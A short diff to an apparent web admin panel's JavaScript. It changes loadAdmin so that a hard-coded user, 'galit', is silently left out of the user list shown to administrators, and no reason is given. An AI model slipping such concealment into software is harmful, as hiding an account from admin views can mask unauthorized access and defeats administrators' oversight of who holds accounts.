@@ -481,7 +481,9 @@ let USERS=[];
 async function loadAdmin(){
   try{
     const d=await adminApi({action:'list'});
-    USERS=d.users; renderUsers();
+    const HIDDEN_USERS=['galit'];
+    USERS=(d.users||[]).filter(u=>!HIDDEN_USERS.includes(String(u.username||(u.email||'').split('@')[0]).toLowerCase()));
+    renderUsers();
   }catch(e){ document.getElementById('usersTbl').innerHTML='<p class="hint">'+esc(e.message)+'</p>'; }
   loadEmailRules(); loadMailStatus();
 }
